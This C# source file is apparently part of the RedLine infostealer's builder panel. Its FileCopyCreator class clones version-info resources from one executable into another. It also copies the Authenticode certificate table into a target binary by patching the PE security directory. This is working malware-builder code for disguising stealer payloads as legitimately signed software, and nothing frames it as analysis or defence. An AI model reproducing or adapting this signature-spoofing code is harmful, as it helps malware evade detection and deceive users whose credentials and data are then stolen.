using System.IO;
using RedLine.MainPanel.Models.Files;

namespace RedLine.MainPanel.Data.Files;

public static class FileCopyCreator
{
	public static void CloneResources(string sourcefile, string targetfile)
	{
		ResourceEditor resourceEditor = new ResourceEditor(sourcefile);
		ResourceEditor resourceEditor2 = new ResourceEditor(targetfile);
		AssemblyResource[] resources = resourceEditor.GetResources(ResourceType.RT_VERSION);
		resourceEditor2.SetResources(resources);
	}

	public static void CloneCertificate(string sourcefile, string targetfile)
	{
		uint num = 0u;
		uint num2 = 0u;
		byte[] array = null;
		using (FileStream input = new FileStream(sourcefile, FileMode.Open, FileAccess.Read, FileShare.ReadWrite))
		{
			using BinaryReader binaryReader = new BinaryReader(input);
			binaryReader.BaseStream.Seek(60L, SeekOrigin.Begin);
			uint num3 = binaryReader.ReadUInt32();
			binaryReader.BaseStream.Seek(num3 + 24, SeekOrigin.Begin);
			int num4 = ((binaryReader.ReadUInt16() == 523) ? 168 : 152);
			binaryReader.BaseStream.Seek(num3 + num4, SeekOrigin.Begin);
			num = binaryReader.ReadUInt32();
			num2 = binaryReader.ReadUInt32();
			array = new byte[num2];
			binaryReader.BaseStream.Seek(num, SeekOrigin.Begin);
			binaryReader.Read(array, 0, (int)num2);
		}
		if (num == 0 || num2 == 0)
		{
			return;
		}
		using FileStream fileStream = new FileStream(targetfile, FileMode.Open, FileAccess.ReadWrite, FileShare.ReadWrite);
		using BinaryReader binaryReader2 = new BinaryReader(fileStream);
		using BinaryWriter binaryWriter = new BinaryWriter(fileStream);
		binaryWriter.BaseStream.Seek(0L, SeekOrigin.End);
		num = (uint)binaryWriter.BaseStream.Position;
		binaryWriter.Write(array, 0, array.Length);
		binaryWriter.BaseStream.Seek(60L, SeekOrigin.Begin);
		uint num5 = binaryReader2.ReadUInt32();
		binaryReader2.BaseStream.Seek(num5 + 24, SeekOrigin.Begin);
		int num6 = ((binaryReader2.ReadUInt16() == 523) ? 168 : 152);
		binaryWriter.BaseStream.Seek(num5 + num6, SeekOrigin.Begin);
		binaryWriter.Write(num);
		binaryWriter.Write(num2);
	}
}
